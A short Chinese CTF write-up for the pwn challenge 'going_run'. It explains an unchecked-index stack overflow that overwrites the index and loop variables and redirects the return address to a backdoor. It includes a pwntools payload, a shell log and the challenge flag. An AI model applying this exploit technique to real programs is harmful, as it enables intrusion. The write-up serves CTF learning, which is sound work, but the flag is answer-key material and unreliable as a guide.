# going_run

`read()` 的限制是 8 bytes ，且每次读写完后 `char s[]` 的索引 `i` 会自增 1 。因为没有索引是否超出了数组大小的检查，所以可以利用栈溢出修改返回地址，在循环 33 轮循环（ `0 -> 32`）后 `retn` 到后门 `gitf` 。
值得注意的是，`char s[]` 、其索引 `i` 和循环索引 `j` 均在栈上，而反编译伪代码显示 `i` 不得大于 32 、`j` 不得大于 40 。只要利用 `read()` 就可以操纵这些栈上的变量。

```python
for _ in range(21):
    io.send(b'\x00' * 8)

io.send(b'\x00' * 3 + b'\x1f\x00\x00\x00' + b"\x26")

io.send(b"A" + p64(0x401234)[:7])
```

```bash
$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0x37 bytes:
    b'attachment\n'
    b'bin\n'
    b'dev\n'
    b'flag\n'
    b'lib\n'
    b'lib32\n'
    b'lib64\n'
    b'libexec\n'
    b'libx32\n'
attachment
bin
dev
flag
lib
lib32
lib64
libexec
libx32
$ cat flag
[DEBUG] Sent 0x9 bytes:
    b'cat flag\n'
[DEBUG] Received 0x2d bytes:
    b'NSSCTF{9e971773-25ad-467e-b23d-8214278ce6e1}\n'
NSSCTF{9e971773-25ad-467e-b23d-8214278ce6e1}
$  
```

Flag 为 `NSSCTF{9e971773-25ad-467e-b23d-8214278ce6e1}` 。